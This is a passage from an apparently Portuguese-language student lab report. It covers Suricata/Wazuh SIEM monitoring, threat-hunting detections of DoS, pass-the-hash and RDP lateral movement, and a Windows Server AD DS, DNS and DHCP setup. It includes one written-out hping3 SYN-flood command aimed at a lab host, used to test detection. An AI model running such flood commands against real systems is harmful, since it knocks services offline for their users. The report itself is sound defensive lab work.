A imagem demonstra as três fases do motor de análise: a
pré-descodificação do log bruto; a descodificação bem-sucedida pelo
decoder suricata; e a aplicação da regra ID 100200 com nível de alerta
10, confirmando a correta integração e prontidão do sistema para gerar
alertas reais.

##### Simulação de Ataque DoS (Kali Linux) e Deteção em Tempo Real. 

De forma a validar a eficácia da cadeia de monitorização (**Suricata à
Syslog à Wazuh**), executou-se um teste de intrusão controlado a partir
da máquina **Kali Linux** (Zona Red). Utilizando a
ferramenta **hping3**, foi despoletado um ataque de negação de serviço
(*SYN Flood*) direcionado ao servidor na zona *Green*. Como ilustrado
no *dashboard*, o motor de análise do Wazuh correlacionou os eventos
recebidos via *syslog*, gerando alertas críticos baseados nas regras
personalizadas previamente configuradas, confirmando a capacidade do
sistema em detetar anomalias de tráfego de rede.

┌──(antonio㉿kali)-\[\~\]

└─\$ sudo hping3 -S \--flood -p 80 10.30.50.130

![](./images/media/image215.png)

*Figura 171 - Visualização de alertas de segurança no Dashboard do Wazuh
após ataque DoS.*

![](./images/media/image216.png)

*Figura 172 - Detalhe do alerta estruturado no Wazuh após simulação de
ataque DoS.*

## Encaminhamento de Alertas para Servidor Externo (Syslog-ng)

Para garantir a redundância dos dados e permitir a centralização de
eventos num repositório secundário, procedeu-se à configuração
do **Wazuh Manager** para encaminhar os seus alertas para um
servidor **Syslog-ng**. Esta integração permite que todos os incidentes
detetados pelo SIEM sejam replicados para um servidor de logs dedicado,
facilitando a retenção a longo prazo e a correlação de eventos com
outras fontes de dados da infraestrutura.

##### Edição do Ficheiro de Configuração ossec.conf

A ativação do envio de logs requer a edição do ficheiro de configuração
principal do sistema (**/var/ossec/etc/ossec.conf**). Este passo permite
definir o motor de saída de dados do Wazuh para comunicar com sistemas
externos via protocolo Syslog.

##### Implementação do Bloco de Configuração de Saída (Syslog Output)

No final do ficheiro ossec.conf, inseriu-se o bloco de configuração
específico para o servidor de destino. Nesta secção, definem-se
parâmetros críticos como o endereço IP do servidor **Syslog-ng**, o
porto de comunicação (normalmente 514) e o formato dos eventos,
assegurando que o fluxo de alertas é transmitido de forma estruturada e
contínua

\<syslog_output\>

\<level\>5\</level\>

\<server\>172.30.50.194\</server\>

\<port\>514\</port\>

\<format\>default\</format\>

\</syslog_output\>

![](./images/media/image217.png)

*Figura 173 - Configuração do envio de alertas para o servidor
Syslog-ng.*

##### Finalização e Reinício do Serviço Wazuh Manager

Após a configuração dos blocos de saída no ficheiro ossec.conf, é
necessário aplicar as alterações ao sistema. Como o **Wazuh
Manager** carrega as definições apenas no momento da inicialização, o
reinício do serviço via **systemctl** é o passo que efetivamente ativa o
motor de exportação de logs (Syslog Output). Este procedimento garante
que o gestor de alertas comece a encaminhar os eventos em tempo real
para o servidor externo configurado (172.30.50.194).

systemctl restart wazuh-manager

![](./images/media/image218.png)

*Figura 174 - Sequência de comandos para validação do diretório de
configuração, edição do ficheiro ossec.conf e reinício do serviço
wazuh-manager para ativação do Syslog.*

## Threat Hunting e Deteção de Incidentes

Nesta fase, utilizou-se a capacidade de análise em tempo real do Wazuh
para monitorizar e identificar atividades maliciosas na infraestrutura.
Através do painel de Threat Hunting, foi possível intercetar e
correlacionar eventos gerados por um ataque direcionado, originado pela
máquina Kali_Red.

O SIEM identificou com sucesso padrões de autenticação suspeitos,
disparando alertas de nível 6 para tentativas de logon remoto via NTLM.
A precisão dos descodificadores do Wazuh permitiu não só detetar a
intrusão, mas também sugerir a natureza do ataque (possível
pass-the-hash), facilitando uma resposta rápida ao incidente e a
identificação imediata do alvo comprometido na rede.

![](./images/media/image219.png)

*Figura 175 - Painel de Threat Hunting do Wazuh exibindo alertas
críticos de \"Successful Remote Logon\" e potenciais ataques
de pass-the-hash provenientes do Kali_Red.*

![](./images/media/image220.png)

![](./images/media/image221.png)

![](./images/media/image222.png)

![](./images/media/image223.png)

![](./images/media/image224.png)

![](./images/media/image225.png)

*Figura 176 - Alerta crítico de \"Successful Remote Logon\" e potencial
ataque de pass-the-hash proveniente do Kali_Red.*

**Análise Detalhada do Incidente: Deteção de Pass-the-Hash**

O **Wazuh** identificou um evento de segurança crítico durante a fase de
monitorização, gerando o alerta: *\"Successful Remote Logon Detected -
User:\\plinha - NTLM authentication, possible pass-the-hash attack\"*.

A análise minuciosa dos **Indicadores de Comprometimento (IoC)** revelou
um padrão de ataque sofisticado:

-   **Anomalia no Protocolo de Autenticação (NTLM vs.
    Kerberos):** Enquanto o acesso legítimo num domínio Active Directory
    utiliza predominantemente **Kerberos**, este evento registou o uso
    de **NTLM V2**. Esta alteração é um forte indicador de que o
    atacante utilizou o *hash* da palavra-passe em vez da credencial em
    texto claro.

-   **Mapeamento MITRE ATT&CK (T1550.002):** O SIEM classificou
    automaticamente a atividade como a técnica **T1550.002 (Pass the
    Hash)**. O atacante, operando a partir da máquina **Kali_Red**, terá
    capturado o *hash* do utilizador plinha para realizar o movimento
    lateral.

-   **Escalamento de Severidade (Rule Level 6):** A transição de alertas
    de nível 3 (informativos/logon normal) para o **Nível 6** demonstra
    o reconhecimento, por parte do Wazuh, de uma tentativa de intrusão
    com maior potencial de danos.

-   **Correlação de Eventos e Origem:** O acesso foi rastreado até à
    estação **WINCLIENT_RED**, previamente identificada como
    comprometida. A sucessão de um RDP legítimo seguido de uma
    autenticação NTLM suspeita confirma a correlação de eventos que
    distingue uma atividade maliciosa de um acesso administrativo
    padrão.

##### Ataque DoS: Kali Linux (Zona Red) via hping3

Nesta etapa do projeto, simulou-se um cenário de ameaça interna
persistente utilizando a máquina Kali_Red (localizada na zona de rede
\"Red Zone\"). O objetivo foi testar a resiliência dos ativos face a um
ataque de Negação de Serviço (DoS).

Para a execução da ofensiva, utilizou-se a ferramenta hping3,
configurada para realizar um *flood* de pacotes UDP direcionado ao alvo.
Como demonstrado no log detalhado, o motor Suricata identificou o padrão
de tráfego anómalo em tempo real. A integração com o Wazuh permitiu a
correlação imediata do evento, classificando-o com a Rule ID 80700 e um
nível de gravidade 10 (Critical). Esta deteção é fundamental, pois o
volume massivo de pacotes gerado pelo hping3 visa esgotar os recursos de
rede e processamento do host de destino, tornando-o indisponível para
utilizadores legítimos.

![](./images/media/image226.png)

*Figura 177 - Alerta crítico no Wazuh detalhando a deteção de um ataque
de **DoS (Denial of Service)** executado com a ferramenta **hping3** a
partir da máquina **Kali_Red**.*

![](./images/media/image227.png)

*Figura 178 - Alerta crítico no Wazuh detalhando a deteção de um ataque
de **DoS (Denial of Service)** executado com a ferramenta **hping3** a
partir da máquina **Kali_Red**.*

##### Análise de Movimento Lateral e Escalamento de Privilégios: Do Kali ao Windows Server

A sequência de ataque culminou no acesso total ao controlador de
domínio. Após o comprometimento inicial do Windows 11 via **Reverse
Shell**, o atacante realizou um movimento lateral através do
protocolo **RDP** para o Windows Server. O log apresentado (Event ID
4672) é a prova técnica desta intrusão bem-sucedida, registando o
momento exato em que a conta Administrator iniciou sessão e recebeu
privilégios críticos de sistema (SeDebugPrivilege). Este evento é um
indicador de comprometimento (IoC) de alta severidade, confirmando que o
atacante detém agora o controlo total sobre a infraestrutura de
diretório (Active Directory).

![](./images/media/image228.png)

![](./images/media/image229.png) *Figura 179 - Alerta do Wazuh confirmando
o sucesso do movimento lateral via RDP, com a atribuição de privilégios
administrativos totais no Windows Server.*

##### Deteção e Mitigação de Ameaça Externa Real (Caso de Estudo)

Durante a fase de monitorização, o SIEM detetou uma série de eventos
críticos originados por um endereço IP externo (**34.120.208.123**), que
não pertencia ao ambiente controlado do projeto. Este incidente serviu
como um teste real à eficácia da arquitetura de segurança implementada,
demonstrando a integração entre o IDS (Suricata) e a capacidade de
resposta automática do Wazuh.

O ataque seguiu uma progressão típica de reconhecimento, onde o atacante
utilizou ferramentas de scanning para mapear a rede da escola. A
infraestrutura respondeu de forma escalonada: primeiro detetando a
intrusão, gerando alertas críticos por e-mail e, finalmente, aplicando
um bloqueio automático (Active Response) para isolar a ameaça.

![](./images/media/image230.png)

*Figura 180 - Alerta inicial de reconhecimento via Nmap (ACK scan)
intercetado pelo Suricata no host martesuf.*

![](./images/media/image231.png)

*Figura 181 - Notificação de alerta crítico (Nível 12) com acionamento
automático de envio de e-mail para a equipa de segurança.*

![](./images/media/image232.png)

*Figura 182 - Detalhe da assinatura do Suricata (ET SCAN NMAP -sA)
identificando a técnica específica de mapeamento de firewall.*

![](./images/media/image233.png)

*Figura 183 - Correlação de eventos no painel do Wazuh, consolidando os
logs do IDS e identificando o IP de origem externa.*

![](./images/media/image234.png)

*Figura 184 - Registo da Resposta Ativa (Active Response): o Wazuh
ordena o bloqueio imediato do IP atacante através do
script firewall-drop.*

![](./images/media/image235.png)

*Figura 185 - Confirmação do bloqueio no log de active-responses.log,
demonstrando a mitigação bem-sucedida do ataque em tempo real.*

![](./images/media/image236.png)

![](./images/media/image237.png)

*Figura 186 - Consulta de reputação no portal **AbuseIPDB**, confirmando
que o IP 34.120.208.123 (Google Cloud) possui mais de 600 reportes por
atividades abusivas e um nível de confiança de abuso de 29%, validando a
natureza maliciosa do varrimento detetado.*

Após a deteção e mitigação automática do ataque, procedeu-se a uma
investigação detalhada sobre a proveniência do endereço
IP **34.120.208.123**. Através de ferramentas de *Threat Intelligence*,
como o **AbuseIPDB** e o **VirusTotal**, foi possível validar a natureza
maliciosa do evento:

-   **Abuso de Infraestrutura Cloud:** Embora o endereço esteja
    registado sob a alçada da **Google LLC (Google Cloud Platform -
    GCP)**, isto não indica uma atividade oficial da Google. Trata-se de
    um caso típico de **Abuso de Cloud**, onde atacantes alugam Máquinas
    Virtuais (VMs) em fornecedores de renome para herdar a sua largura
    de banda e reputação de IP, tentando assim contornar filtros básicos
    de firewall.

-   **Histórico de Incidentes:** A consulta ao **AbuseIPDB** revelou que
    este IP possui um elevado índice de reporte por parte de outros
    administradores de sistemas a nível global, estando associado a
    atividades persistentes de **Port Scanning** e tentativas de
    intrusão.

-   **Diferenciação de Tráfego Legítimo:** É importante notar que, ao
    contrário dos *crawlers* legítimos (como o Googlebot), que se
    limitam a indexar conteúdos web, este IP executou um **Nmap -sA (ACK
    scan)**. Este comportamento é puramente ofensivo, visando mapear
    regras de filtragem de pacotes e identificar vulnerabilidades na
    rede da escola.

**Conclusão da Análise:**\
A correlação destes dados externos com os alertas gerados pelo Suricata
confirma que a infraestrutura foi alvo de um varrimento malicioso
automatizado. A resposta imediata do Wazuh (Active Response) provou ser
eficaz contra ameaças reais que exploram infraestruturas de larga escala
para ocultar a sua origem.

### Conclusão: Eficácia da Monitorização e Resposta a Incidentes

A análise detalhada dos eventos de **Threat Hunting** demonstrou a
robustez da arquitetura de segurança implementada. O **Wazuh**, em
conjunto com o **Suricata**, provou ser capaz de correlacionar ataques
em múltiplas camadas: desde o varrimento inicial de rede
(**Nmap/hping3**) e tentativas de **DoS**, até às fases críticas de
movimento lateral e **escalamento de privilégios** em ambiente Windows
(Event ID 4672).

A visibilidade total sobre o fluxo do ataque --- permitindo identificar
a origem (**Kali_Red**), o método (**Reverse Shell/RDP**) e o impacto
final --- valida o SIEM como uma ferramenta indispensável na deteção
precoce de intrusões. Este cenário reforça que a proteção de uma
infraestrutura moderna depende não apenas de barreiras estáticas
(firewalls), mas de uma monitorização ativa capaz de identificar
comportamentos anómalos e garantir a integridade dos ativos críticos do
domínio.

![](./images/media/image238.png)

*Figura 187 - Representação conceptual do módulo de Threat
Hunting do **Wazuh**, focado na identificação e isolamento de agentes
maliciosos entre utilizadores legítimos da infraestrutura.*

# 

## Configuração do Controlador de Domínio: Microsoft Windows Server

### Introdução

O Windows Server 2022 foi implementado como a peça central da gestão de
identidade e recursos da infraestrutura. Ao configurar as funções de
Active Directory Domain Services (AD DS) e DNS, o servidor assume o
papel de Controlador de Domínio, permitindo a gestão centralizada de
utilizadores, computadores e políticas de segurança (GPOs) em toda a
rede corporativa. Esta centralização é fundamental para garantir a
autenticação única e o controlo de acessos baseado em privilégios.

###  Instalação e Configuração de Funções

A configuração do servidor seguiu uma metodologia faseada, desde a
atribuição de um endereço IP estático e nome de host apropriado até à
promoção do servidor a Controlador de Domínio. Para garantir a correta
organização dos ativos de rede e a aplicação de políticas diferenciadas,
procedeu-se à criação de uma estrutura hierárquica de **Unidades
Organizacionais (OU\'s)**, grupos de segurança e contas de utilizador,
conforme definido nos requisitos do enunciado.

Deve-se seguir os passos ilustrados nas figuras seguintes para a correta
replicação deste cenário.

![](./images/media/image239.png)

*Figura 188 - Configuração inicial de idioma, fuso horário e teclado
durante o processo de instalação do sistema operativo Microsoft Windows
Server 2022 em ambiente virtualizado (VMware Workstation).*

![](./images/media/image240.png)

*Figura 189 - Início do assistente de instalação do Windows Server 2022
após o arranque (boot) bem-sucedido da imagem ISO.*

![](./images/media/image241.png)

*Figura 190 - Seleção da edição **Windows Server 2022 Datacenter
(Desktop Experience)** para instalação com interface gráfica (GUI).*

![](./images/media/image242.png)

*Figura 191 - Seleção da opção de instalação personalizada (**Custom**)
para configuração manual das partições de disco.*

![](./images/media/image243.png)

*Figura 192 - Monitorização do progresso da cópia e preparação dos
ficheiros de sistema no processo de instalação.*

![](./images/media/image244.png)

*Figura 193 - Definição da palavra-passe de segurança para a conta de
administrador local do sistema.*

![](./images/media/image245.png)

*Figura 194 -* Configuração do endereço **IP estático** (172.30.50.98) e
definição do servidor DNS.

![](./images/media/image246.png)

*Figura 195 - Alteração do nome do servidor para WINSERVER_AMM e
definição do sufixo DNS primário do sistema.*

### Promoção do Servidor: Implementação do Active Directory Domain Services (AD DS) Introdução

A configuração do Active Directory Domain Services é o passo fundamental
para converter o Windows Server num Controlador de Domínio (DC). Este
serviço permite a gestão centralizada de identidades, autenticação e
permissões em toda a rede. Através do Server Manager, inicia-se o
assistente de configuração para instalar as funções necessárias, que
servirão de base para a criação da estrutura hierárquica da organização.

![](./images/media/image247.png)

*Figura 196 - Acesso ao menu \"Add Roles and Features\" para iniciar a
instalação da função de Controlador de Domínio.*

![](./images/media/image248.png)

*Figura 197 - Início do assistente \"Add Roles and Features\" para
configuração do servidor.*

![](./images/media/image249.png)

Seleção do tipo de instalação baseada em funções ou funcionalidades.

![](./images/media/image250.png)

*Figura 198 - Seleção do servidor de destino no Server Pool para a
instalação.*

![](./images/media/image251.png)

*Figura 199 - Seleção da função Active Directory Domain Services (AD
DS).*

![](./images/media/image252.png)

*Figura 200 - Adição de funcionalidades e ferramentas de gestão
necessárias para o AD DS.*

![](./images/media/image253.png)

*Figura 201 - Seleção de funcionalidades adicionais para o sistema
operativo.*

![](./images/media/image254.png)

*Figura 202 - Resumo informativo sobre a função Active Directory Domain
Services.*

![](./images/media/image255.png)

*Figura 203 - Confirmação das seleções e autorização para reinício
automático do servidor.*

![](./images/media/image256.png)

*Figura 204 - Confirmação final e início da instalação das funções
selecionadas.*

### Configuração do Active Directory Domain Services (AD DS)

Nesta fase, procede-se à instalação e configuração do **Active Directory
Domain Services (AD DS)**, o serviço fundamental para a gestão
centralizada de utilizadores, computadores e políticas de segurança na
rede. A implementação inicia-se através do gestor de servidor (**Server
Manager**), onde são selecionadas as funções e funcionalidades
necessárias para transformar o servidor num **Controlador de Domínio**.

![](./images/media/image257.png)

*Figura 205 - Aviso de notificação para início da configuração
pós-instalação do AD DS.*

![](./images/media/image258.png)

*Figura 206 - Seleção da opção para promover o servidor a Controlador de
Domínio.*

![](./images/media/image259.png)

*Figura 207 - Criação de uma nova floresta e definição do nome do
domínio de raiz.*

![](./images/media/image260.png)

*Figura 208 - Definição dos níveis funcionais e da palavra-passe do
Directory Services Restore Mode (DSRM).*

![](./images/media/image261.png)

*Figura 209 - Configuração das opções de delegação de DNS para o novo
domínio.*

![](./images/media/image262.png)

*Figura 210 - Verificação e atribuição do nome NetBIOS ao novo domínio.*

![](./images/media/image263.png)

*Figura 211 - Definição dos caminhos para a base de dados, logs e pasta
SYSVOL do AD DS.*

![](./images/media/image264.png)

*Figura 212 - Revisão geral de todas as opções de configuração
selecionadas para o AD DS.*

![](./images/media/image265.png)

*Figura 213 - Verificação bem-sucedida dos pré-requisitos e início da
instalação final.*

![](./images/media/image266.png)

*Figura 214 - Ecrã de início de sessão após a promoção bem-sucedida ao
novo domínio.*

### Configuração e Gestão do Serviço DNS

O serviço DNS (Domain Name System) é fundamental para o funcionamento do
Active Directory, sendo utilizado para localizar controladores de
domínio e autenticar utilizadores. Uma resolução de nomes correta
garante a estabilidade da rede, permitindo que os serviços sejam
localizados eficientemente pelos clientes. Inversamente, uma
configuração incorreta pode resultar em falhas de início de sessão,
problemas na replicação do AD e dificuldades na comunicação geral da
infraestrutura.

Por predefinição, a Zona de Pesquisa Direta é criada automaticamente
durante a promoção do AD DS. Nesta etapa, procedeu-se à configuração da
Zona de Pesquisa Inversa, cujo objetivo principal é permitir que o DNS
traduza endereços IP em nomes de domínio (FQDN). Embora a criação desta
zona não seja obrigatória, é altamente recomendada em ambientes
empresariais para facilitar o diagnóstico de rede, aumentar a segurança
e suportar serviços internos que dependem da resolução inversa.

![](./images/media/image267.png)

*Figura 215 - Acesso à consola de gestão do DNS através das ferramentas
administrativas do Server Manager.*

No painel do Server Manager, aceda ao menu \'Tools\' e selecione a
consola DNS. Em seguida, na consola de gestão, clique com o botão
direito sobre \'Reverse Lookup Zones\' e selecione \'New Zone\' para
iniciar o assistente de configuração.

![](./images/media/image268.png)

*Figura 216 - Acesso à opção \"New Zone\" para iniciar a criação da Zona
de Pesquisa Inversa.*

No assistente de configuração (**New Zone Wizard**), clique em \'Next\'
para avançar e, no ecrã seguinte, selecione a opção **\'Primary
zone\'** para definir este servidor como o detentor da cópia principal
da zona DNS.

![](./images/media/image269.png)

*Figura 217 - Início do assistente de configuração e seleção do tipo de
zona primária.*

![](./images/media/image270.png)

*Figura 218 - Seleção do tipo de zona como Primária para o serviço DNS.*

![](./images/media/image271.png)

*Figura 219 - Definição do âmbito de replicação da zona DNS para todos
os controladores de domínio.*

No âmbito de replicação da zona, selecione a opção que abrange todos os
controladores de domínio no domínio atual. No passo seguinte, escolha a
opção **\'IPv4 Reverse Lookup Zone\'** e introduza o **Network
ID** correspondente à sub-rede do servidor.

![](./images/media/image272.png)

*Figura 220 - Seleção do protocolo IPv4 para a criação da nova Zona de
Pesquisa Inversa.*

![](./images/media/image273.png)

*Figura 221 - Introdução do Network ID para identificação da rede na
Zona de Pesquisa Inversa.*

No passo relativo às **\'Dynamic Updates\'**, selecione a opção para
permitir apenas atualizações dinâmicas seguras, garantindo assim que
apenas clientes autenticados no domínio possam registar os seus registos
DNS. Para finalizar o processo, clique em **\'Finish\'** no ecrã de
resumo.

![](./images/media/image274.png)

*Figura 222 - Configuração das atualizações dinâmicas seguras para a
nova zona DNS.*

![](./images/media/image275.png)

*Figura 223 - Conclusão e resumo da configuração da nova Zona de
Pesquisa Inversa.*

Para concluir a configuração do DNS, é necessário criar um registo PTR
(Pointer Record), que associa o endereço IP do servidor ao seu nome de
domínio (FQDN). O procedimento para a criação deste registo é detalhado
nos passos seguintes.

![](./images/media/image276.png)

*Figura 224 - Seleção da opção \"New Pointer (PTR)\" na Zona de Pesquisa
Inversa.*

![](./images/media/image277.png)

*Figura 225 - Seleção do Host Name para o novo registo PTR através do
botão \"Browse\".*

![](./images/media/image278.png)

*Figura 226 - Seleção do registo de anfitrião (Host A) para associação
ao registo PTR.*

![](./images/media/image279.png)

*Figura 227 - Confirmação da seleção do registo de anfitrião para a
criação do ponteiro.*

![](./images/media/image280.png)

*Figura 228 - Confirmação da seleção do registo de anfitrião para a
criação do ponteiro.*

![](./images/media/image281.png)

*Figura 229 - Confirmação da seleção do registo de anfitrião para a
criação do ponteiro.*

![](./images/media/image282.png)

*Figura 230 - Conclusão da criação do registo PTR com a associação do IP
ao Host Name.*

![](./images/media/image283.png)

*Figura 231 - Visualização final da consola DNS com os registos de
anfitrião (Host A) configurados.*

Com a criação da Zona de Pesquisa Inversa e o registo dos respetivos
ponteiros (PTR), a configuração do serviço DNS encontra-se concluída e
funcional, garantindo a resolução bidirecional de nomes necessária para
a infraestrutura do domínio.

### Configuração do Serviço DHCP

**Instalação e Configuração**

Para iniciar a implementação do serviço DHCP (Dynamic Host Configuration
Protocol), aceda ao Server Manager e selecione a opção \"Add Roles and
Features\". No assistente de configuração, selecione o tipo de
instalação \"Role-based or feature-based installation\", permitindo
assim a atribuição automática de endereços IP aos dispositivos da rede.

![](./images/media/image284.png)

*Figura 232 - Acesso à opção \"Add Roles and Features\" através do menu
Manage do Server Manager.*

![](./images/media/image285.png)

*Figura 233 -* Seleção do tipo de instalação baseada em funções ou
funcionalidades.

No ecrã de seleção do servidor, confirme o servidor de destino no Server
Pool e, no passo seguinte relativo às Server Roles, selecione a função
DHCP Server para ativação do serviço.

![](./images/media/image286.png)

*Figura 234 - Seleção do servidor local no Server Pool para a instalação
da função DHCP.*

Confirme a inclusão das ferramentas de gestão necessárias em **\'Add
Features\'**. Como demonstrado na imagem seguinte, selecione a
função **DHCP Server** para instalação.

![](./images/media/image287.png)

*Figura 235 - Seleção da função DHCP Server e confirmação das
funcionalidades de gestão.*

![](./images/media/image288.png)

*Figura 236 - Confirmação da adição das ferramentas de gestão
necessárias para o servidor DHCP.*

Clique em **Seguinte** nos menus indicados de seguida.

![](./images/media/image289.png)

*Figura 237 - Passagem pelo ecrã de seleção de funcionalidades
adicionais do sistema.*

![](./images/media/image290.png)

*Figura 238 -* Resumo informativo sobre a função e requisitos do
Servidor DHCP.

Inicie a instalação.

![](./images/media/image291.png)

*Figura 239 -* Revisão final das seleções e início da instalação da
função DHCP.

![](./images/media/image292.png)

*Figura 240 -* Conclusão da instalação da função DHCP e indicação de
configuração pendente.

Após a instalação, é necessário finalizar a configuração do serviço. No
painel de notificações do **Server Manager**, clique
em **\'More\...\'** e, na janela seguinte, selecione a
opção **\'Complete DHCP configuration\'** para iniciar o assistente de
pós-instalação.

![](./images/media/image293.png)

*Figura 241 - Seleção da notificação para iniciar a configuração
pós-instalação do DHCP.*

![](./images/media/image294.png)

*Figura 242 - Execução da tarefa de pós-implementação para completar a
configuração do DHCP.*

No ecrã de descrição do assistente, clique em **\'Next\'** para avançar.
Na etapa de **Autorização**, as credenciais do utilizador administrador
são assumidas automaticamente; este processo é crucial, pois garante que
apenas servidores autorizados no Active Directory possam atribuir
endereços IP na rede. Clique em **\'Commit\'** para validar a
autorização.

![](./images/media/image295.png)

*Figura 243 - Seleção de credenciais de administrador para autorização
do servidor DHCP no domínio.*

Como demonstrado no ecrã de resumo, a criação dos grupos de segurança e
a autorização do servidor no domínio foram concluídas com sucesso.
Clique em **\'Close\'** para encerrar o assistente de configuração
pós-instalação.\"

![](./images/media/image296.png)

*Figura 244 - Conclusão do assistente de pós-instalação e confirmação da
autorização do DHCP*

![](./images/media/image297.png)

*Figura 245 - Acesso à consola de gestão do DHCP através do menu Tools
no Server Manager.*

Para proceder à criação do **Âmbito (Scope) de DHCP**, aceda ao
menu **\'Tools\'** no **Server Manager** e selecione a
consola **\'DHCP\'**. Na árvore de consola, à esquerda, expanda o
servidor e clique com o botão direito do rato sobre o
protocolo **\'IPv4\'**.\".

![](./images/media/image298.png)

*Figura 246 - Seleção da opção \"New Scope\" para iniciar o assistente
de configuração de um novo âmbito IPv4.*

No ecrã de boas-vindas do **New Scope Wizard**, clique
em **\'Next\'** para iniciar a configuração. No passo seguinte (**Scope
Name**), defina um nome identificativo e uma breve descrição para o novo
âmbito, facilitando a sua gestão futura na consola DHCP. Clique
em **\'Next\'** para prosseguir.

![](./images/media/image299.png)

*Figura 247 - Início do assistente \"New Scope Wizard\" para a
configuração do novo âmbito de endereços.*

![](./images/media/image300.png)

*Figura 248 - Atribuição de um nome e descrição identificativos ao novo
Âmbito de DHCP.*

Nesta etapa, deve-se definir o intervalo de endereços IP (**IP Address
Range**) que o servidor poderá atribuir automaticamente. É fundamental
considerar a reserva de endereços estáticos para equipamentos críticos
da infraestrutura, garantindo que não ocorram conflitos de IP. Para este
projeto, a segmentação da rede foi planeada da seguinte forma:

-   **172.30.50.97:** Reservado para o Gateway (Firewall MarteSuf).

-   **172.30.50.98:** Reservado para o Windows Server 2022 (Domain
    Controller).

-   **172.30.50.99 a 172.30.50.110:** Intervalo de endereços dinâmicos
    disponíveis para os restantes dispositivos da zona Green, como
    estações de trabalho Windows e sistemas Linux.

![](./images/media/image301.png)

*Figura 249 - Configuração do intervalo de endereços IP (Start/End IP) e
da máscara de sub-rede.*

![](./images/media/image302.png)

*Figura 250 - Configuração de exclusões de endereços IP e atraso na
transmissão de mensagens DHCP.*

No ecrã **\'Lease Duration\'**, deve definir o tempo de concessão dos
endereços IP, sendo o valor predefinido de 8 dias adequado para a
maioria das redes locais. Após clicar em **\'Next\'**, selecione a
opção **\'Yes, I want to configure these options now\'** para prosseguir
com a configuração de parâmetros adicionais, como o Gateway e o servidor
DNS.

![](./images/media/image303.png)

*Figura 251 - Definição da duração da concessão (Lease Duration) para os
endereços IP.*

![](./images/media/image304.png)

*Figura 252 - Seleção da opção para configurar de imediato os parâmetros
adicionais do âmbito.*

![](./images/media/image305.png)

*Figura 253 - Configuração do endereço IP do Router (Default Gateway)
para o novo âmbito.*

No ecrã **\'Domain Name and DNS Servers\'**, confirme o nome do domínio
e os endereços dos servidores DNS, que deverão estar preenchidos
automaticamente devido à integração com o Active Directory. Após
avançar, ignore a configuração de **\'WINS Servers\'**, uma vez que este
serviço se destina a sistemas operativos obsoletos e não é necessário
para esta infraestrutura moderna. Clique em **\'Next\'** para
prosseguir.

![](./images/media/image306.png)

*Figura 254 - Configuração do nome de domínio e servidores DNS para o
novo âmbito.*

![](./images/media/image307.png)

*Figura 255 - Passagem pelo ecrã de configuração de Servidores WINS
(opcional).*

![](./images/media/image308.png)

*Figura 256 - Seleção da opção para ativar o novo âmbito (Scope) de DHCP
imediatamente.*

![](./images/media/image309.png)

*Figura 257 - Conclusão do assistente e criação bem-sucedida do novo
Âmbito de DHCP.*

A configuração do serviço DHCP foi concluída com sucesso. Como
demonstrado na consola de gestão, o novo âmbito encontra-se no
estado **\'Active\'**, estando totalmente operacional para a atribuição
dinâmica de endereços IP aos dispositivos da rede.

![](./images/media/image310.png)

*Figura 258 - Visualização do âmbito de DHCP configurado e em estado
\"Active\" na consola de gestão.*

### Active Directory -- Estrutura Lógica (Ous, Grupos e Utilizadores)

**Introdução**

Após a configuração dos serviços base do Windows Server, procedeu-se à
organização lógica do domínio. Esta etapa consistiu na criação das
Unidades Organizacionais (OUs) por localização geográfica (Norte, Sul,
Este), conforme o diagrama do projeto, e no provisionamento dos
utilizadores e grupos de segurança necessários para a gestão de acessos
e autenticação VPN.

No **Server Manager**, aceda ao menu **Tools** e selecione a
consola **Active Directory Users and Computers** para iniciar a gestão
da estrutura do domínio.

![](./images/media/image311.png)

*Figura 259 - Acesso à consola de gestão de Utilizadores e Computadores
do Active Directory.*

##### Estruturação Hierárquica de Unidades Organizativas (OUs)

Com base nos requisitos do enunciado, a estrutura lógica do
domínio **AntMarMat.win** foi organizada para permitir uma gestão
granular de políticas. O processo de criação seguiu estes passos:

-   **Acesso e Criação Base:** No console ADUC, clicou-se com o botão
    direito no domínio raiz para criar as OUs de topo.

-   **Divisão Geográfica:** Foram criadas as três OUs principais
    correspondentes às localizações: **Este**, **Sul** e **Norte**.

-   **Gestão de Objetos:** Criou-se uma OU dedicada a **Grupos** na raiz
    do domínio para centralizar a administração de permissões.

-   **Segmentação Departamental:** No interior de cada localização
    (Este, Sul e Norte), foram estruturadas as
    sub-OUs: **IT**, **Formacao** e **RH**.

Esta hierarquia facilita a aplicação de **GPOs (Group Policy
Objects)** específicas por departamento e região, garantindo que as
restrições aplicadas à Formação no \"Este\" não interfiram, por exemplo,
com os privilégios de IT no \"Norte\".

![](./images/media/image312.png)

*Figura 260 - Criação da Unidade Organizativa (OU) \"Este\" no domínio
AntMarMat.win através da consola ADUC.*

![](./images/media/image313.png)

*Figura 261 - Criação da Unidade Organizativa (OU) Sul no domínio
AntMarMat.win.*

![](./images/media/image314.png)

*Figura 262 - Criação da Unidade Organizativa (OU) Norte no domínio
AntMarMat.win.*

![](./images/media/image315.png)

*Figura 263 - Criação da Unidade Organizativa (OU) Grupos na raiz do
domínio AntMarMat.win.*

![](./images/media/image316.png)

*Figura 264 - Estrutura final das Unidades Organizativas (OUs)
principais no domínio AntMarMat.win.*

#####  Implementação de Grupos de Segurança Globais

Para centralizar a gestão de permissões e facilitar a atribuição de
acessos a recursos partilhados e políticas de segurança, foram
criados **Grupos de Segurança (Global)** na respetiva Unidade
Organizativa (**Grupos**):

-   **Grupos de Administração Técnica:** Criação dos
    grupos **ITGeral**, **ITNorte**, **ITSul** e **ITEste** para a
    gestão segmentada das equipas de suporte.

-   **Grupos de Gestão Administrativa:** Implementação do
    grupo **RHGeral**, entre outros grupos departamentais, conforme a
    necessidade de controlo de acessos e permissões NTFS.

![](./images/media/image317.png)

*Figura 265 - Processo de criação de um novo Grupo de Segurança no
interior da OU Grupos.*

![](./images/media/image318.png)

*Figura 266 - Definição do nome e tipo de grupo (Security - Global) para
o grupo ITGeral.*

![](./images/media/image319.png)

*Figura 267 - Criação do grupo de segurança ITNorte no interior da OU
Grupos.*

![](./images/media/image320.png)

*Figura 268 - Criação do grupo de segurança ITSul no interior da OU
Grupos.*

![](./images/media/image321.png)

*Figura 269 - Criação do grupo de segurança ITEste no interior da OU
Grupos.*

![](./images/media/image322.png)

*Figura 270 - Criação do grupo de segurança RHGeral no interior da OU
Grupos.*

##### Configuração de Subunidades Organizativas (Sub-OUs)

**Introdução**\
Para garantir uma organização departamental eficiente dentro de cada
região, procedeu-se à criação de **Sub-OUs** específicas. Esta
segmentação em **IT**, **Formacao** e **RH** permite aplicar políticas
de grupo (GPOs) e permissões de rede diferenciadas, respondendo às
